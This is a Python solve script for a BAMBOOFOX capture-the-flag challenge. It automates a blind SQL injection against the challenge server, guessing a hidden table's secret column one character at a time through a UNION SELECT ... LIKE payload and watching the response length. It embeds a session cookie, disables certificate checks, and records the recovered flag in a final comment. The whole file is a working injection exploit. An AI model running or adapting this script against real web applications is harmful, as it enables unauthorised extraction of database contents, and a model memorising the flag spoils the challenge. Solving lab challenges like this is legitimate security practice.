import requests 
from string import ascii_letters, digits

all_string = ascii_letters+digits+'\_'+ '!'+ '#'+ '@'+ '$'+ '}'

url = "https://bamboofox.cs.nctu.edu.tw:13302/?id="
query = "'union SELECT secretco1umn FROM secret7able where secretco1umn like '{}%' escape '\\';--"

flag = "BAMBOOFOX{1223b8c30a347321299611f873b449ad"

cookies = {
        "_bamboofox_website_session":"eS0XDDvtyr30BZm30Rr%2BMeIc%2B2FDU5ARvmjd2u8jZEO3yGRIl5y4SNHaESr5mvWYEtGLbmnE6ZYoIXkT2SSEKcPKeB1BrAWih8IfWbJLCrc7XB6LWj63BrR2JUEPK3bW86m%2BVjpiaDod7M7NAiob03EGK%2BbEiIlJ0GNAgLdO%2BHr26YtFlSGhM9zB4ToXeeZM6mOxBFVyqCl3o46%2FZk%2BsiSiyGS3nLHC5DKUW1WBf--rl6M%2BmA2PA%2BP%2BVHl--KMt6NmXPZYc9eM75TWX%2BpA%3D%3D"
        }
requests.packages.urllib3.disable_warnings()
while flag[-1]!='}':
    for c in all_string:
        nxf = flag + c
        q = query.format(nxf)
        r = requests.get(url+q, cookies=cookies, verify=False).content
        if(len(r)!=3176):
            flag = nxf
            print(flag)
            break
    else:
        print("lost")
        break

#BAMBOOFOX{1223b8c30a347321299611f873b449ad}
